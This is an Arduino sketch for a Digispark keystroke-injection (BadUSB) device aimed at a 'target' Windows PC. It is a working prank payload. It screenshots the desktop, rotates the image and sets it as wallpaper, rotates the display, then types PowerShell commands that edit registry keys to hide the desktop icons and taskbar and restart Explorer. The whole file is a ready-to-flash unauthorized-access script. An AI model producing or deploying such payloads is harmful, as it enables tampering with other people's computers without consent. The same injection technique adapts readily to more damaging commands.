// Change the keyboard layout to that of your target
#define keyboardlayout_fr

// Import CustomDigiKeyboard library
#include "CustomDigiKeyboard.h"

void setup() {
  // Initialize the digital pin as an output
  pinMode(1, OUTPUT);
  // Reset KeyStroke
  DigiKeyboard.sendKeyStroke(0);
}

void loop() {
  // Turn the LED on while program is running
  digitalWrite(1, HIGH);

  // Switch to desktop
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Screnshot fullsreen
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_SHIFT_LEFT | MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  for (int k = 0; k < 4; k++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(100);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  // Hide screenshot notification
  DigiKeyboard.sendKeyStroke(KEY_V, MOD_SHIFT_LEFT | MOD_GUI_LEFT);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_DELETE);
  DigiKeyboard.delay(250);

  // Open paint
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("mspaint");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // Paste screenshot
  DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(250);
  // Rotate screenshot
  DigiKeyboard.sendKeyStroke(KEY_C, MOD_ALT_LEFT);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_P);
  DigiKeyboard.sendKeyStroke(KEY_I);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_T);
  DigiKeyboard.delay(250);
  // Save screenshot
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("%USERPROFILE%\\background_prank.jpg");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // Confirm overwrite file if it exists or does nothing
   DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // Set screenshot as background
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_B);
  DigiKeyboard.delay(500);
  // Close paint
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);

  // Rotate screen
  DigiKeyboard.sendKeyStroke(0, KEY_GUI);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("rotate");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);

  // Open powershell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // Hide desktop icons
  DigiKeyboard.print(F("$p=\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\\"\n"));
  DigiKeyboard.print(F("Set-ItemProperty -Path $p -Name \"HideIcons\" -Value 1\n"));
  DigiKeyboard.print(F("Get-Process \"explorer\"|Stop-Process\n"));
  // Hide windows toolbar
  DigiKeyboard.print(F("$p='HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3'\n"));
  DigiKeyboard.print(F("$v=(Get-ItemProperty -Path $p).Settings\n"));
  DigiKeyboard.print(F("$v[8]=3\n"));
  DigiKeyboard.print(F("Set-ItemProperty -Path $p -Name Settings -Value $v\n"));
  DigiKeyboard.print(F("Stop-Process -f -ProcessName explorer\n"));
  // Exit powershell
  DigiKeyboard.print("exit\n");
  DigiKeyboard.delay(500);

  // Turn the LED off
  digitalWrite(1, LOW);
  // End of program
  while(1);
}
